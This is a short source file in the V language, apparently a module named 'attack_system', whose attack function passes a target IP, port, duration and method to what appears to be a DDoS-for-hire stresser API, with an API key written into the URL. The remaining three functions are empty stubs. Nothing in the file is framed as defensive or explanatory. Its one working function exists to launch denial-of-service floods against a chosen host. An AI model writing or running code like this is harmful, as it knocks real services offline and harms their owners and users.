module attack_system

import net.http

pub fn attack(ip string, port string, time string, method string) {
	mut resp := http.get_text("https://toxicstress.live/api.go/key=3543645876123&host=${ip}&port=${port}&time=${time}&method=${method}")
	println(resp)
}


pub fn send_attack(ip string, port string, time string, method string) {

}

pub fn fill_api(ip string, port string, time string, method string) {

}

pub fn get_all_api() {
	
}